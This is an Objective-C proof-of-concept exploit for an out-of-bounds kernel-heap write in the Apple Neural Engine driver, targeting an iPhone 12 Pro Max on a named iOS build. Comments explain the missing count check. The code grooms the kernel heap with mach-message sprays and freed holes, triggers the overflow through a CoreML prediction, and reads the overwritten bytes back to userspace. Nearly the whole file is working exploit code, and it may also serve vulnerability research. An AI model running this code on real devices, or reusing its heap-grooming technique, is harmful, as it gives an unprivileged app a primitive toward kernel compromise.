//
//  main.m — ANE auto-prewire OOB kernel write (standalone demonstration)
//
//  TARGET:  iPhone 12 Pro Max (iPhone13,4, A14) — iOS 26.5.2 (23F84)
//  CHANNEL: unentitled app → CoreML → AppleH11ANEInterface → FUN_fffffff00874c070
//  CLASS:   kernel-heap out-of-bounds WRITE with userspace READBACK
//
//  ─── THE BUG ────────────────────────────────────────────────────────────────
//  When an ANE program (a compiled CoreML model) is submitted for inference,
//  the driver "auto-prewires" every uncached IO buffer referenced by the
//  request. It allocates a memoryMapRequest object with room for a FIXED 128
//  entries (class-14 kalloc_data band, ~0x800 bytes of records) and then
//  fills ONE 16-BYTE RECORD PER IO BUFFER — with NO count check:
//
//      // kernel side (decompiled, 23F84):
//      buf = alloc(fixed 128-entry object)          // once per request
//      for (i = 0; i < program_io_count; i++) {     // program_io_count: model-set
//          rec = buf + index * 16;                  // index grows unbounded
//          rec->id  = surface_id;                   // u32 — sequential counter
//          rec->sym = io_symbol;                    // u32 — 64/66 family
//          rec->pad = 0x100000001ULL;               // constant family
//      }
//
//  A model with MORE than 128 uncached IO buffers therefore writes records
//  PAST the object into whatever occupies the adjacent kernel-heap elements.
//  Fixed in 26.6.1 ("uncached IO > max allowed" guard); LIVE and unguarded
//  on 26.5.2.
//
//  ─── THE RECORDS ────────────────────────────────────────────────────────────
//  Each 16-byte record: {u32 id, u32 sym, u64 0x100000001-family}.
//    id  — the IOSurface id of the IO buffer: a fresh sequential counter we
//          steer by creating surfaces in a chosen order before loading the
//          model (attacker-choosable in window).
//    sym — the model's IO symbol ordinal (64/66… determined by the model).
//    pad — constant 0x100000001.
//
//  ─── THE PROOF CHANNEL (readback) ─────────────────────────────────────────
//  We spray ~1000 small mach messages (held = queued on ports we own). Each
//  message's inline body lives in a kalloc_data element in the SAME size
//  band as the memoryMapRequest object. We free every third one, then run
//  the predict:
//      • the overflow's records spill into the freed/adjacent elements
//      • we then RECEIVE our held messages and scan their bytes
//      • records found in a message body = bytes the kernel wrote OOB,
//        returned to userspace — the round-trip proof.
//  (2 records per round is the canonical mo68 result: the spill depth of
//  that model reaches just past one element boundary.)
//
//  ─── MODEL REQUIREMENT ─────────────────────────────────────────────────────
//  The trigger model must have >128 uncached IO buffers AND still compile
//  to the ANE. mo68 (68 inputs × 256×256 convs + 8 outputs ⇒ 196 records)
//  is the proven shape. Push the compiled bundle to the app container:
//      devicectl copy to ... --destination tmp/mo68o.mlmodelc
//
//  ─── RUN ───────────────────────────────────────────────────────────────────
//  Env: ANEWRITE_MODEL=<name.mlmodelc>  ANEWRITE_ROUNDS=<n>  ANEWRITE_N=<spray>
//  Expected output:
//      [AW] R0 sprayed 1000 freed 334
//      [AW] RECORD buf 842 off 0: id=0x1b4 sym=64 | ...
//      [AW] RECORD buf 842 off 0x10: id=0x1b5 sym=66 | ...
//      [AW] round scan: 2 records in 1 bufs
//

#import <Foundation/Foundation.h>
#import <CoreML/CoreML.h>
#import <mach/mach.h>
#import <unistd.h>
#import <errno.h>

// ---------------------------------------------------------------------------
// message spray state
// ---------------------------------------------------------------------------
#define AW_MAX 1000
static mach_port_t aw_ports[AW_MAX];
static uint8_t     aw_bufs[AW_MAX][0xC40] __attribute__((aligned(4096)));
static int          aw_held[AW_MAX];
static int          aw_n_saved;
static long         aw_freed_total;

// ---------------------------------------------------------------------------
// spray: send N inline mach messages. Even slots 0xBF0 bytes (class-15 mix),
// odd slots 0x7F0 (class-14 — the memoryMapRequest band). Each message body
// is filled with a unique position-tagged pattern so any corruption of it is
// attributable to this run and this buffer index.
// ---------------------------------------------------------------------------
static int aw_spray(int n)
{
    memset(aw_held, 0, sizeof(aw_held));
    for (int i = 0; i < n; i++) {
        if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &aw_ports[i]))
            return i;
        mach_port_insert_right(mach_task_self(), aw_ports[i], aw_ports[i],
                               MACH_MSG_TYPE_MAKE_SEND);
        uint32_t msz = (i & 1) ? 0xBF0 : 0x7F0;
        uint64_t *p64 = (uint64_t *)(aw_bufs[i] + 0x40);
        for (uint32_t j = 0; j < (msz - 0x40) / 8; j++)
            p64[j] = 0xAB000000CD000000ULL | ((uint64_t)i << 16) | j;
        mach_msg_header_t *mh = (mach_msg_header_t *)aw_bufs[i];
        memset(aw_bufs[i], 0, 0x40);
        mh->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
        mh->msgh_size = msz;
        mh->msgh_remote_port = aw_ports[i];
        mh->msgh_id = 0x3000 + i;
        if (mach_msg(mh, MACH_SEND_MSG, msz, 0, MACH_PORT_NULL,
                     MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL)) return i;
        aw_held[i] = 1;
    }
    return n;
}

// ---------------------------------------------------------------------------
// holes: free every third held message. The freed elements sit adjacent to
// the upcoming memoryMapRequest allocation; the overflow's records land
// in/around them. (The full harness uses 6 per-CPU-magazine worker threads;
// simplified to the main thread here.)
// ---------------------------------------------------------------------------
static void aw_make_holes(void)
{
    static uint8_t rb[0xC40] __attribute__((aligned(16)));
    for (int i = 0; i < aw_n_saved; i += 3) {
        memset(rb, 0, 0x40);
        mach_msg_header_t *mh = (mach_msg_header_t *)rb;
        mh->msgh_size = 0xC30;
        if (mach_msg(mh, MACH_RCV_MSG, 0, sizeof(rb), aw_ports[i],
                     MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL)) continue;
        aw_held[i] = 0;
        aw_freed_total++;
    }
}

// ---------------------------------------------------------------------------
// scan: receive every held message back and look for the OOB records in the
// body. Record signature: {u32 id, u32 sym∈{64,66,..}, u64 0x100000001-adj}.
// Anything found here was written by the KERNEL past its allocation into our
// message element — the readback.
// ---------------------------------------------------------------------------
static void aw_scan_and_report(int round)
{
    static uint8_t rb[0xC40] __attribute__((aligned(16)));
    int recs = 0, hitbufs = 0;
    for (int i = 0; i < aw_n_saved; i++) {
        if (!aw_held[i]) continue;
        memset(rb, 0, 0x40);
        mach_msg_header_t *mh = (mach_msg_header_t *)rb;
        mh->msgh_size = 0xC30;
        if (mach_msg(mh, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(rb),
                     aw_ports[i], 100, MACH_PORT_NULL) != KERN_SUCCESS) continue;
        for (int off = 0x40; off + 16 <= 0xC30 - 0x40; off += 8) {
            uint32_t id = *(uint32_t *)(rb + off);
            uint32_t sym = *(uint32_t *)(rb + off + 4);
            uint64_t pad = *(uint64_t *)(rb + off + 8);
            if ((sym == 64 || sym == 66) &&
                (pad >> 32) == 0x00000001ULL) {
                printf("[AW] RECORD buf %d off 0x%x: id=0x%x sym=%u "
                       "| prev=%016llx next=%016llx\n",
                       i, off, id, sym,
                       (unsigned long long)*(uint64_t *)(rb + off - 8),
                       (unsigned long long)*(uint64_t *)(rb + off + 16));
                recs++;
                if (!hitbufs) hitbufs = 1;
            }
        }
    }
    printf("[AW] round scan: %d records in %d bufs\n", recs, hitbufs);
    fflush(stdout);
}

// ---------------------------------------------------------------------------
// the trigger: load the >128-IO model and run one predict. The predict path
// allocates the fixed 128-entry memoryMapRequest and fills
// program_io_count(=196 for mo68) records — 68 records past the boundary.
// ---------------------------------------------------------------------------
static int aw_run_predict(MLModel **model, NSString *modelPath)
{
    if (!*model) {
        NSError *le = nil;
        *model = [MLModel modelWithContentsOfURL:[NSURL fileURLWithPath:modelPath]
                                           error:&le];
        printf("[AW] model load %s\n", *model ? "ok" : "FAIL");
        fflush(stdout);
        if (!*model) return 1;
    }
    // build fp16 zero-ish inputs per the model's declared shape
    NSMutableDictionary *fd = [NSMutableDictionary dictionary];
    for (NSString *k in (*model).modelDescription.inputDescriptionsByName) {
        MLMultiArrayConstraint *c =
            (*model).modelDescription.inputDescriptionsByName[k].multiArrayConstraint;
        MLMultiArray *ma = [[MLMultiArray alloc] initWithShape:c.shape
                                                      dataType:c.dataType error:nil];
        size_t total = 1;
        for (NSNumber *dim in c.shape) total *= dim.unsignedLongValue;
        if (c.dataType == MLMultiArrayDataTypeFloat16)
            for (size_t i = 0; i < total; i++)
                ((unsigned short *)ma.dataPointer)[i] = 0x3800; // fp16 0.5
        fd[k] = ma;
    }
    NSError *pe = nil;
    MLDictionaryFeatureProvider *fp =
        [[MLDictionaryFeatureProvider alloc] initWithDictionary:fd error:&pe];
    if (!pe) [*model predictionFromFeatures:fp options:[[MLPredictionOptions alloc] init] error:&pe];
    printf("[AW] predict done (err=%d)\n", pe ? 1 : 0);
    fflush(stdout);
    return pe ? 1 : 0;
}

// ---------------------------------------------------------------------------
// main: spray → holes → predict → scan, R rounds
// ---------------------------------------------------------------------------
int main(int argc, char *argv[])
{
    printf("=== ANE OOB kernel write — standalone demonstrator ===\n");
    printf("target: iPhone13,4 / iOS 26.5.2 — FUN_874c070 auto-prewire fill\n\n");
    fflush(stdout);

    const char *mp = getenv("ANEWRITE_MODEL") ?: "mo68o.mlmodelc";
    int rounds = atoi(getenv("ANEWRITE_ROUNDS") ?: "2");
    int nbuf = atoi(getenv("ANEWRITE_N") ?: "1000");
    if (nbuf > AW_MAX) nbuf = AW_MAX;

    NSString *path = @(mp);
    if (![path hasPrefix:@"/"])
        path = [NSTemporaryDirectory() stringByAppendingPathComponent:path];

    MLModel *model = nil;
    for (int r = 0; r < rounds; r++) {
        int n = aw_spray(nbuf);
        aw_n_saved = n; aw_freed_total = 0;
        aw_make_holes();
        printf("[AW] R%d sprayed %d freed %ld\n", r, n, aw_freed_total);
        fflush(stdout);
        aw_run_predict(&model, path);
        aw_scan_and_report(r);
        // release round state
        for (int i = 0; i < n; i++) {
            if (aw_ports[i]) {
                mach_port_mod_refs(mach_task_self(), aw_ports[i],
                                   MACH_PORT_RIGHT_SEND, -1);
                mach_port_mod_refs(mach_task_self(), aw_ports[i],
                                   MACH_PORT_RIGHT_RECEIVE, -1);
                aw_ports[i] = MACH_PORT_NULL;
            }
        }
    }
    printf("[AW] done — records above = kernel-written OOB bytes read back\n");
    fflush(stdout);
    return 0;
}
